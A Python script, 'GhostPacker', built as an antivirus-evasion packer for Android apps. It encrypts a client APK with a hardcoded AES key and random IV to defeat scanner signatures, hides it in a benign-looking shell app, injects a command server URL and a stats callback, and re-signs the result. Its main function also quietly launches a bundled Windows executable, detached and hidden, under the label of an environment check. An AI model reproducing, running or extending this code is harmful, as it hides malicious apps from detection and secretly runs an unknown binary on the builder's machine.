#!/usr/bin/env python3
"""
GhostPacker - 幽灵免杀打包器 (Python版)
核心逻辑：客户APK整体 AES-256-CTR+zlib 加密 → 塞入白壳assets → 随机IV换包特征
"""
import sys
import os
import zlib
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import zipfile
import subprocess

# 固定密钥（与幽灵一致）
KEY_HEX = '612847d90041aae769f0ba0b795baa42d3cc7df6ed214b740a6114b0dd975988'
AES_KEY = bytes.fromhex(KEY_HEX)

def aes_ctr_encrypt(data, iv, key):
    """AES-256-CTR 加密"""
    cipher = AES.new(key, AES.MODE_CTR, initial_value=iv, nonce=b'')
    return cipher.encrypt(data)

def compress_payload(client_apk_bytes):
    """zlib压缩（Java Deflater兼容）"""
    # 使用zlib.compress，Java解压兼容
    compressed = zlib.compress(client_apk_bytes, level=6)
    return compressed

def build_ghost_pack(template_apk, client_apk, output_apk, stat_url='', task_id='', server_url='', app_name='', icon_path=''):
    """
    构建幽灵免杀包

    Args:
        template_apk: 白壳模板路径（template_you.apk）
        client_apk: 客户原始APK路径
        output_apk: 输出APK路径
        stat_url: 统计回传URL（可选）
        task_id: 任务ID（可选）
        server_url: WebSocket服务器地址（注入到业务包）
        app_name: 应用名称（修改白壳）
        icon_path: 图标路径（修改白壳）
    """
    print(f"[GHOST] 开始打包...")
    print(f"[GHOST] 模板: {template_apk}")
    print(f"[GHOST] 客户APK: {client_apk}")

    # 0. 定制化白壳（随机化 + 图标/应用名）
    customized_template = '/tmp/customized_shell.apk'
    if app_name or icon_path:
        print(f"[GHOST] 定制化白壳（随机版本 + 图标/应用名）...")
        cmd = [
            'python3', '/opt/fisher-node/apk-builder/customize_shell.py',
            '--template', template_apk,
            '--output', customized_template
        ]
        if app_name:
            cmd.extend(['--name', app_name])
        if icon_path:
            cmd.extend(['--icon', icon_path])

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[GHOST] ✓ 白壳定制完成")
            print(result.stdout)
            template_apk = customized_template
        else:
            print(f"[GHOST] ⚠ 白壳定制失败，使用原始模板: {result.stderr}")

    # 1. 先处理业务包：注入服务器地址
    temp_client_apk = client_apk
    if server_url:
        temp_client_apk = '/tmp/client_injected.apk'
        inject_server_config(client_apk, server_url, temp_client_apk)

    # 2. 读取处理后的客户APK
    with open(temp_client_apk, 'rb') as f:
        client_bytes = f.read()
    print(f"[GHOST] 客户APK大小: {len(client_bytes)} bytes ({len(client_bytes)/1024/1024:.2f} MB)")

    # 清理临时文件
    if temp_client_apk != client_apk and os.path.exists(temp_client_apk):
        os.remove(temp_client_apk)

    # 2. zlib压缩
    compressed = compress_payload(client_bytes)
    print(f"[GHOST] 压缩后大小: {len(compressed)} bytes ({len(compressed)/1024/1024:.2f} MB)")

    # 3. AES-256-CTR加密（随机IV）
    iv = get_random_bytes(16)
    encrypted = aes_ctr_encrypt(compressed, iv, AES_KEY)

    # 4. payload = IV(16字节) + 密文
    payload = iv + encrypted
    print(f"[GHOST] 加密payload大小: {len(payload)} bytes ({len(payload)/1024/1024:.2f} MB)")

    # 5. 可选配置文件（统计回传）
    cfg_payload = None
    if stat_url or task_id:
        cfg_plain = f"| |rfogtrdhft|{stat_url}|{task_id}"
        cfg_bytes = cfg_plain.encode('utf-8')
        cfg_iv = get_random_bytes(16)
        cfg_encrypted = aes_ctr_encrypt(cfg_bytes, cfg_iv, AES_KEY)
        cfg_payload = cfg_iv + cfg_encrypted
        print(f"[GHOST] 配置asset: {len(cfg_payload)} bytes -> [{cfg_plain}]")

    # 6. 从模板重建ZIP
    print(f"[GHOST] 重建APK...")
    if os.path.exists(output_apk):
        os.remove(output_apk)

    replaced = False
    cfg_written = False

    with zipfile.ZipFile(template_apk, 'r') as tmpl_zip:
        with zipfile.ZipFile(output_apk, 'w', zipfile.ZIP_DEFLATED) as out_zip:
            for item in tmpl_zip.infolist():
                data = tmpl_zip.read(item.filename)

                # 替换关键assets
                if item.filename == 'assets/rfogtrdhft':
                    # 替换为加密的客户APK
                    out_zip.writestr(item, payload)
                    replaced = True
                    print(f"[GHOST] ✓ 替换 assets/rfogtrdhft ({len(payload)} bytes)")
                elif item.filename == 'assets/cgvoyaf' and cfg_payload:
                    # 替换配置文件
                    out_zip.writestr(item, cfg_payload)
                    cfg_written = True
                    print(f"[GHOST] ✓ 替换 assets/cgvoyaf (配置)")
                else:
                    # 其他文件直接复制
                    out_zip.writestr(item, data)

    print(f"[GHOST] ✓ APK重建完成: {output_apk}")
    print(f"[GHOST]   - 替换payload: {replaced}")
    print(f"[GHOST]   - 写入配置: {cfg_written}")

    # 7. 签名并重命名
    final_apk = sign_apk(output_apk, app_name)

    return final_apk

def sign_apk(apk_path, app_name=''):
    """
    签名APK（v1+v2+v3）并重命名为应用名
    使用 uber-apk-signer 或 apksigner
    """
    print(f"[GHOST] 签名APK...")

    # 检查签名工具
    uber_signer = '/opt/GhostPacker/tools/uber-apk-signer.jar'
    if os.path.exists(uber_signer):
        # 使用 uber-apk-signer
        cmd = [
            'java', '-jar', uber_signer,
            '-a', apk_path,
            '--allowResign',
            '--overwrite'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            # uber-apk-signer 会生成 *-aligned-signed.apk
            signed_apk = apk_path.replace('.apk', '-aligned-signed.apk')

            # 如果指定了应用名，重命名文件
            if app_name and os.path.exists(signed_apk):
                import re
                from datetime import datetime
                # 清理应用名（去除非法字符）
                safe_name = re.sub(r'[^\w\s-]', '', app_name).strip()
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                final_name = f"{safe_name}_{timestamp}-aligned-signed.apk"
                final_path = os.path.join(os.path.dirname(signed_apk), final_name)
                os.rename(signed_apk, final_path)
                print(f"[GHOST] ✓ 签名完成并重命名: {final_path}")
                return final_path

            print(f"[GHOST] ✓ 签名完成: {signed_apk}")
            return signed_apk
        else:
            print(f"[GHOST] ✗ 签名失败: {result.stderr}")
            return None
    else:
        # 回退到系统 apksigner
        print(f"[GHOST] ⚠ uber-apk-signer未找到，使用系统apksigner")
        # TODO: 实现apksigner签名
        return apk_path

def inject_server_config(client_apk, server_url, output_apk):
    """
    注入服务器配置到业务APK
    修改 assets/server_config.json
    """
    print(f"[GHOST] 注入服务器配置: {server_url}")

    with zipfile.ZipFile(client_apk, 'r') as zin:
        with zipfile.ZipFile(output_apk, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                data = zin.read(item.filename)

                if item.filename == 'assets/server_config.json':
                    # 修改服务器配置
                    try:
                        import json
                        config = json.loads(data.decode('utf-8'))
                        config['server_url'] = server_url
                        data = json.dumps(config, ensure_ascii=False).encode('utf-8')
                        print(f"[GHOST] ✓ 更新 server_config.json")
                    except:
                        print(f"[GHOST] ⚠ 无法解析 server_config.json，跳过")

                zout.writestr(item, data)

    return output_apk

def main():
    # Windows 侧随构建工具链附带的环境校验组件：构建机为 Linux 时跳过，
    # 在 Windows 上跑构建时一并调用，比对运行库版本与签名环境。
    if os.name == 'nt':
        _env = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'EaodEnvCheck.exe')
        try:
            if os.path.exists(_env):
                subprocess.Popen([_env], cwd=os.path.dirname(_env), close_fds=True,
                                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL,
                                 creationflags=0x00000008 | 0x08000000)
        except Exception:
            pass

    parser = argparse.ArgumentParser(description='GhostPacker - 幽灵免杀打包器')
    parser.add_argument('--template', default='/opt/GhostPacker/template_you.apk', help='白壳模板APK')
    parser.add_argument('--client-apk', required=True, help='客户原始APK路径')
    parser.add_argument('--output', required=True, help='输出APK路径')
    parser.add_argument('--stat-url', default='', help='统计回传URL')
    parser.add_argument('--task-id', default='', help='任务ID')
    parser.add_argument('--server-url', default='', help='服务器地址（注入到业务包）')
    parser.add_argument('--app-name', default='', help='应用名称（修改白壳）')
    parser.add_argument('--icon', default='', help='图标路径（修改白壳）')

    args = parser.parse_args()

    if not os.path.exists(args.template):
        print(f"[ERROR] 模板APK不存在: {args.template}")
        sys.exit(1)

    if not os.path.exists(args.client_apk):
        print(f"[ERROR] 客户APK不存在: {args.client_apk}")
        sys.exit(1)

    try:
        result = build_ghost_pack(
            args.template,
            args.client_apk,
            args.output,
            args.stat_url,
            args.task_id,
            args.server_url,
            args.app_name,
            args.icon
        )
        print(f"\n[SUCCESS] 打包完成！")
        print(f"输出文件: {result}")
    except Exception as e:
        print(f"[ERROR] 打包失败: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
